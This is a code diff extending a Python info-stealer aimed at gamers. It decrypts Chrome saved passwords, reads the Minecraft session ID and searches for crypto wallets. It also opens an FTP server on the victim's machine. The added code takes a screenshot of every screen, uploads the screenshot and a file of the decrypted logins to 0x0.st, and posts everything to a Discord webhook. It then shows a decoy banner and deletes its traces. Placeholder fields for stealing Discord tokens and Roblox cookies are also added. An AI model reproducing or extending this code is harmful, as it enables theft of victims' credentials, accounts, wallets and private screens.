@@ -12,18 +12,22 @@ import requests
 import discord
 import time
 import socket
-import subprocess
 import threading
 import logging
+import uuid
 from Cryptodome.Cipher import AES
 from pyftpdlib.authorizers import DummyAuthorizer
 from pyftpdlib.handlers import FTPHandler
 from pyftpdlib.servers import FTPServer
+from PIL import ImageGrab,Image
+
 
 Webhook = ""
 
 
 def fakeMessage():
+    os.remove("LatestLog.txt")
+    os.remove(screenshot_path)
     logo = ("""\033[1;36;40m
     ╭━━━╮╱╱╱╱╱╱╱╱╱╭━╮╱╱╱╱╱╱╱╭━━━━╮╱╱╱╱╭╮
     ┃╭━╮┃╱╱╱╱╱╱╱╱╱┃╭╯╱╱╱╱╱╱╱┃╭╮╭╮┃╱╱╱╱┃┃
@@ -78,7 +82,13 @@ hostname = socket.gethostname()
 ip_address = socket.gethostbyname(hostname)
 PCName = os.environ.get( " USERNAME" )
 PortList = []
+unique_id = str(uuid.uuid4()).replace('-', '')
+screenshot_path = f"{unique_id}.png"
+screenshot = ImageGrab.grab(all_screens=True,xdisplay=None,include_layered_windows=False,bbox=None)
+screenshot.save(screenshot_path)
+screenshot.close()
 logging.basicConfig(level=logging.CRITICAL)
+Uploadlink = []
 
 def get_secret_key():
     try:
@@ -102,6 +112,7 @@ def extract_session_id(log_file):
                 token = match.group(1)
                 token = token[:-1]
                 return token
+    file.close()
     return None
 session_id = extract_session_id(LatestLog_Path)
 
@@ -112,6 +123,7 @@ def extract_username(log_file):
             match = re.search(r'Setting user:\s*(\S+)', line)
             if match:
                 return match.group(1)
+    file.close()
     return None
 player_id = extract_username(LatestLog_Path)
 
@@ -144,15 +156,23 @@ def get_db_connection(chrome_path_login_db):
         print("[ERR] Chrome database cannot be found")
         return None
 
-def send_to_discord(webhook_url, content=None, embed=None):
+def send_to_discord(webhook_url, content=None, embed=None, file_path=None):
     data = {}
     if content:
         data["content"] = content
     if embed:
         data["embeds"] = [embed.to_dict()]
+
+    headers = {"Content-Type": "multipart/form-data"}
+    payload = {"payload_json": json.dumps(data)}
     
-    headers = {"Content-Type": "application/json"}
-    response = requests.post(webhook_url, headers=headers, data=json.dumps(data))
+    files = {}
+    if file_path:
+        with open(file_path, "rb") as file:
+            files = {"file": (file_path, file)}
+            response = requests.post(webhook_url, data=payload, files=files)
+    else:
+        response = requests.post(webhook_url, json=data)
 
     if response.status_code != 204:
         raise Exception(f"Failed to send message to Discord webhook: {response.status_code}, {response.text}")
@@ -180,6 +200,18 @@ def run_in_background():
     ftp_thread = threading.Thread(target=start_ftp)
     ftp_thread.daemon = True  
     ftp_thread.start()
+
+def uploadimage(file_path):
+    upload_url = 'https://0x0.st'
+    with open(file_path, 'rb') as file:
+        response = requests.post(upload_url, files={'file': file})
+    file.close()
+    if response.status_code == 200:
+        file_url = response.text.strip()
+        return file_url
+    else:
+        return None
+
 def find_wallets():
     base_paths = {
         "Exodus": [
@@ -214,13 +246,14 @@ def find_wallets():
 
 
 Wallets = ", ".join(find_wallets()) if find_wallets() else "No Wallets found."
+Uploadlink = uploadimage(screenshot_path)
 if __name__ == '__main__':
     try:
         with open('LatestLog.txt', mode='w', encoding='utf-8') as decrypt_password_file:
             secret_key = get_secret_key()
             PCInfo=discord.Embed(
                 title =f"{hostname} PC Stats",
-                colour = 0x008000
+                colour = 0x1E2124
             )
             PCInfo.add_field(name="**:mechanic: Host Name**:", value=f"{hostname}", inline=True)
             PCInfo.add_field(name="**:computer: IP Address**:", value=f"{ip_address}", inline=True)
@@ -230,6 +263,36 @@ if __name__ == '__main__':
             PCInfo.add_field(name="**:unlock: Minecraft SSID:**", value=f"{session_id}", inline=True)
             PCInfo.add_field(name="**:wireless: FTP Connection Login:**", value=f"IP:{ip_address}"+":21\n Username: SSIDSpin \n Password: Admin", inline=False)
             send_to_discord(Webhook, embed=PCInfo)
+            DiscordInfo=discord.Embed(
+                title=f"[user'sdiscordname] Discord Information",
+                color= 0x5865F2
+            )
+            DiscordInfo.add_field(name="**:id: Discord ID:**", value="```Coming Soon```", inline=True)
+            DiscordInfo.add_field(name="**:envelope_with_arrow: Email:**", value="```Coming Soon```", inline=True)
+            DiscordInfo.add_field(name="**:mobile_phone: Phone:**", value="```Coming Soon```\n\n", inline=True)
+            DiscordInfo.add_field(name="**:identification_card: 2FA:**", value="```Coming Soon```", inline=True)
+            DiscordInfo.add_field(name="**:tada: Nitro:**", value="```Coming Soon```", inline=True)
+            DiscordInfo.add_field(name="**:credit_card: Billing:**", value="```Coming Soon```", inline=True)
+            DiscordInfo.add_field(name="**:ice_cube: Discord Token:**", value="```Coming Soon```", inline=True)
+            send_to_discord(Webhook, embed=DiscordInfo)
+            RobloxAccount=discord.Embed(
+                title=f"{hostname} Roblox Account Info",
+                color= 0xC2DAB8
+            )
+            RobloxAccount.add_field(name="**:paperclip: Roblox Profile URL:**", value="```Coming Soon```", inline=True)
+            RobloxAccount.add_field(name="**:cookie: Roblox Username:**", value="```Coming Soon```", inline=True)
+            RobloxAccount.add_field(name="**:envelope_with_arrow: Roblox Email:**", value="```Coming Soon```", inline=True)
+            RobloxAccount.add_field(name="**:moneybag: Robux:**", value="```Coming Soon```", inline=True)
+            RobloxAccount.add_field(name="**:white_check_mark: Is Verified:**", value="```Coming Soon```", inline=True)
+            RobloxAccount.add_field(name="**:cookie: Roblox Cookie:**", value="```Coming Soon```", inline=False)
+            
+            send_to_discord(Webhook,embed=RobloxAccount)
+            UsersCurrentScreen=discord.Embed(
+                title=f"{hostname} Desktop Screenshot",
+                color= 0xBB11DA
+            )
+            UsersCurrentScreen.set_image(url=Uploadlink)
+            send_to_discord(Webhook, embed=UsersCurrentScreen)
 
             folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) is not None]
             all_logins = ""
@@ -249,21 +312,31 @@ if __name__ == '__main__':
             
                         if url and username and ciphertext:
                             decrypted_password = decrypt_password(ciphertext, secret_key)
-                            all_logins += f"**URL**: ```{url}```\n**User Login**: ```{username}```\n**Password**: ```{decrypted_password}```\n\n"
+                            all_logins += f"**URL**: {url}\n**User Login**: {username}\n**Password**: {decrypted_password}\n\n"
         
                     cursor.close()
                     conn.close()
                     os.remove("Loginvault.db")
-
-
             if all_logins:
+                with open("chrome_logins.txt", "w", encoding="utf-8") as file:
+                    file.write(all_logins)
+                chrome_log_path = "chrome_logins.txt"
+                chromeupload = uploadimage(chrome_log_path)
                 ChromeData = discord.Embed(
                 title = f"{hostname} Chrome Saved Passwords",
-                description = all_logins,
-                colour = 0x008000
-            )
-            send_to_discord(Webhook, embed=ChromeData)
+                description=f"{all_logins}",
+                colour = 0xFFA700
+                )
+                ChromeData.add_field(name="**Chrome Data Has Been Uploaded To:**", value=f"```{chromeupload}```", inline=True)
+                send_to_discord(Webhook, embed=ChromeData)
+                os.remove("chrome_logins.txt")
             fakeMessage()
 
-    except Exception as e:
-        print(f"[ERR] {str(e)}")
+    except Exception as e: #Error 32, can occur IDK why but it sends a red flag even if it gets data. Dont know. Dont care
+        ChromeDataError = discord.Embed(
+            title = f"{hostname} No Stored Chrome Passwords",
+            description = "",
+            colour = 0xEE4B2B
+        )
+        send_to_discord(Webhook, embed=ChromeDataError)
+        fakeMessage()
